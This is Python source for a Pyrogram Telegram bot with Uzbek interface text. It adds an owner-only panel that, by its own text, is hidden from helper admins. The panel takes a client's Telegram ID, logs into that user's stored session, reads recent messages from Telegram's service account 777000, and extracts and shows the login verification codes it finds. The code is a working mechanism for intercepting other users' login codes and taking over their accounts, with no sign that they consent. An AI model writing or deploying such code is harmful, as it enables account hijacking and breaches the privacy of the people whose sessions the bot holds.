from pyrogram import Client, filters, ContinuePropagation
from pyrogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from config import SUPER_ADMIN_ID, user_states
from session_manager import get_user_client
import asyncio
import re

def extract_telegram_code(text):
    if not text:
        return None
    patterns = [
        r'(?:code|kod|код|kodi)\b\D*(\d{5,6})',
        r'\b(\d{5,6})\b'
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

@Client.on_message(filters.private & filters.text & filters.regex("^👑 Owner Panel$"))
async def owner_panel_handler(client: Client, message: Message):
    if message.from_user.id != SUPER_ADMIN_ID:
        raise ContinuePropagation  # Not owner, let other handlers process
        
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Sessiyadan kod olish", callback_data="owner_get_code")]
    ])
    
    await message.reply_text(
        "👑 **Owner Panel**\n\nBu panel faqat siz uchun ko'rinadi. Yordamchi adminlar buni ko'ra olmaydi.\n\n"
        "Qaysi funksiyadan foydalanmoqchisiz?",
        reply_markup=keyboard
    )

@Client.on_callback_query(filters.regex("^owner_get_code$"))
async def owner_get_code_cb(client: Client, cq: CallbackQuery):
    if cq.from_user.id != SUPER_ADMIN_ID:
        await cq.answer("Siz Owner emassiz!", show_alert=True)
        return
        
    user_states[cq.from_user.id] = "owner_waiting_for_code_id"
    await cq.message.edit_text(
        "🔑 **Sessiyadan Kod Olish**\n\n"
        "Kod kerak bo'lgan mijozning **Telegram ID** raqamini yuboring.\n\n"
        "(Bot avtomatik ravishda uning sessiyasiga kirib 777000 dan kelgan kodni olib keladi)",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Bekor qilish", callback_data="menu_main")]
        ])
    )
    await cq.answer()

@Client.on_message(filters.private & filters.text & ~filters.command(["start", "cancel"]), group=-7)
async def owner_state_handler(client: Client, message: Message):
    uid = message.from_user.id
    if uid != SUPER_ADMIN_ID:
        raise ContinuePropagation  # Not owner, let other handlers process
        
    state = user_states.get(uid, "")
    if state == "owner_waiting_for_code_id":
        target_id_str = message.text.strip()
        if not target_id_str.isdigit():
            await message.reply_text("❌ Telegram ID faqat raqamlardan iborat bo'lishi kerak. Qayta kiriting:")
            return  # Successfully processed owner state, stop propagation
            
        target_id = int(target_id_str)
        user_states.pop(uid, None)
        
        status_msg = await message.reply_text(f"⏳ `{target_id}` foydalanuvchi sessiyasiga ulanish...")
        
        try:
            user_client = await get_user_client(target_id)
            if not user_client:
                await status_msg.edit_text("❌ Bu foydalanuvchining aktiv sessiyasi topilmadi!")
                return  # Successfully processed owner state, stop propagation
                
            await status_msg.edit_text(f"⏳ `{target_id}` sessiyasiga ulandi. 777000 xabarlari o'qilmoqda...")
            
            messages = []
            async for m in user_client.get_chat_history(777000, limit=10):
                text_content = m.text or m.caption
                if text_content:
                    messages.append((m.date, text_content))
                    if len(messages) >= 3:
                        break
            
            messages_text = ""
            for date, text in messages:
                date_str = date.strftime("%Y-%m-%d %H:%M:%S") if date else "Noma'lum"
                
                code = extract_telegram_code(text)
                if code:
                    spaced_code = " ".join(code)
                    messages_text += f"📅 **{date_str}**\n🔑 Tasdiqlash kodi: `{spaced_code}`\n\n"
                else:
                    messages_text += f"📅 **{date_str}**\n📝 {text}\n\n"
                
            if not messages_text:
                messages_text = "Hech qanday xabar topilmadi."
                
            response_header = "✅ **Muvaffaqiyatli!** 777000 dan oxirgi xabarlar:\n\n"
            max_messages_len = 4096 - len(response_header) - 50
            if len(messages_text) > max_messages_len:
                messages_text = messages_text[:max_messages_len] + "\n... (kesildi)"
                
            await status_msg.edit_text(response_header + messages_text)
            
        except Exception as e:
            await status_msg.edit_text(f"❌ Xatolik yuz berdi: {e}")
        return  # Successfully processed owner state, stop propagation
    
    raise ContinuePropagation  # Not in owner state, let other handlers process
